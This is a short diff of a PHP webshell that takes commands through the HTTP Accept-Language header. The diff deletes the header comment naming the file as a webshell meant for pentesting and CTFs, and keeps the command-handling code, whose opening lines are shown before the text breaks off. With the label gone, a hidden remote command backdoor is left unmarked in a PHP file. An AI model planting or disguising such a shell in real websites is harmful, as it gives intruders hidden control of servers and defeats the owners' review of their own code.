@@ -1,13 +1,5 @@
 <?php
 
-/* 
- *	webshell.php
- *	Project page: github.com/jubal-R/webshell
- *	Webshell to execute commands sent through HTTP_ACCEPT_LANGUAGE header.
- *	Designed for use with python script included in project.
- *	For use in pentesting, CTFs, etc.
-*/
-
 // Check If Command Was Submitted
 if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) && strpos($_SERVER['HTTP_ACCEPT_LANGUAGE'], ':') !== false){
 	// Store Output
